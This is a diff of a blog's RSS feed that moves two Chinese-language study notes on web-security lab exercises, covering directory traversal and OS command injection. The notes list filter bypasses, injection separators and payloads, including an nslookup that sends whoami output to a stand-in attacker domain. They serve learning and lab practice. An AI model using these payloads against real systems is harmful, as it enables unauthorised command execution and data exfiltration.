@@ -523,6 +523,54 @@ crontab -l&lt;/p&gt;
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-3/</guid>
+            <title>BurpLab_3-Directory_traversal</title>
+            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-3/</link>
+            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;一个简单特点&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
+&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
+&lt;li&gt;爆破&lt;/li&gt;
+&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
+&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-4/</guid>
+            <title>BurpLab_4-OS_command_injection</title>
+            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-4/</link>
+            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;executing-arbitrary-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#executing-arbitrary-commands&#34;&gt;#&lt;/a&gt; Executing arbitrary commands&lt;/h1&gt;
+&lt;p&gt;最基础的 payload&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; echo aiwefwlguh &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1|whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+2. 常用指令&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 应用                      Linux          Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用户名                  whoami         whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 操作系统              uname -a       ver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络设置              ifconfig              ipconfig /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络连接              netstat -an         netstat -an&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 进程                     ps -ef          tasklist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;detecting-blind-os-command-injection-using-time-delays&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#detecting-blind-os-command-injection-using-time-delays&#34;&gt;#&lt;/a&gt; Detecting blind OS command injection using time delays&lt;/h1&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; ping -c 10 127.0.0.1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|ping+-c+10+127.0.0.1||&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection by redirecting output&lt;/h1&gt;
+&lt;p&gt;配合目录穿越使用&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; whoami &amp;gt; /var/www/static/whoami.txt &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection using out-of-band (OAST) techniques&lt;/h1&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;ways-of-injecting-os-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ways-of-injecting-os-commands&#34;&gt;#&lt;/a&gt; Ways of injecting OS commands&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;仅 Unix 系统下使用的分隔符：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Newline (0x0a or \n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 还可以通过以下方式执行命令:&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`injected command`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$(injected command )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-2/</guid>
             <title>BurpLab_2-Authentication</title>
             <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-2/</link>
@@ -592,54 +640,6 @@ message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
 &lt;h2 id=&#34;openid-connect&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#openid-connect&#34;&gt;#&lt;/a&gt; OpenID Connect&lt;/h2&gt;
 &lt;p&gt;考虑到 OpenID 是建立在 OAuth 上，许多前面提到的 OAuth 存在的问题 OpenID 也存在，接下来介绍以下由 OpenID 带来的新问题。&lt;br /&gt;
 1.Unprotected dynamic client registration&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-3/</guid>
-            <title>BurpLab_3-Directory_traversal</title>
-            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-3/</link>
-            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
-            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;一个简单特点&lt;br /&gt;
- &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;/loadImage?filename=1.png&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;li&gt;有的服务器会禁止使用相对地址，可以尝试使用绝对地址。&lt;/li&gt;
-&lt;li&gt;有的会替换掉一些关键字符，试着用....// 或 ..../ 绕过。&lt;/li&gt;
-&lt;li&gt;爆破&lt;/li&gt;
-&lt;li&gt;有的要求固定文件路径开头&lt;/li&gt;
-&lt;li&gt;有的要求以特定格式（比如.png）结尾，用 %00 做截断。&lt;/li&gt;
-&lt;/ol&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">http://ericcd.com/2022/12/22/cybersecurity/BurpLab-4/</guid>
-            <title>BurpLab_4-OS_command_injection</title>
-            <link>http://ericcd.com/2022/12/22/cybersecurity/BurpLab-4/</link>
-            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
-            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;executing-arbitrary-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#executing-arbitrary-commands&#34;&gt;#&lt;/a&gt; Executing arbitrary commands&lt;/h1&gt;
-&lt;p&gt;最基础的 payload&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; echo aiwefwlguh &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1|whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
-2. 常用指令&lt;br /&gt;
- &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 应用                      Linux          Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 用户名                  whoami         whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 操作系统              uname -a       ver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络设置              ifconfig              ipconfig /all&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 网络连接              netstat -an         netstat -an&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 进程                     ps -ef          tasklist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;detecting-blind-os-command-injection-using-time-delays&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#detecting-blind-os-command-injection-using-time-delays&#34;&gt;#&lt;/a&gt; Detecting blind OS command injection using time delays&lt;/h1&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; ping -c 10 127.0.0.1 &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|ping+-c+10+127.0.0.1||&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-by-redirecting-output&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection by redirecting output&lt;/h1&gt;
-&lt;p&gt;配合目录穿越使用&lt;br /&gt;
- &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; whoami &amp;gt; /var/www/static/whoami.txt &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques&#34;&gt;#&lt;/a&gt; Exploiting blind OS command injection using out-of-band (OAST) techniques&lt;/h1&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;h1 id=&#34;ways-of-injecting-os-commands&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ways-of-injecting-os-commands&#34;&gt;#&lt;/a&gt; Ways of injecting OS commands&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;仅 Unix 系统下使用的分隔符：&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Newline (0x0a or \n)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
- 还可以通过以下方式执行命令:&lt;br /&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;`injected command`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$(injected command )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
-&lt;/ol&gt;
  ]]></description>
         </item>
         <item>
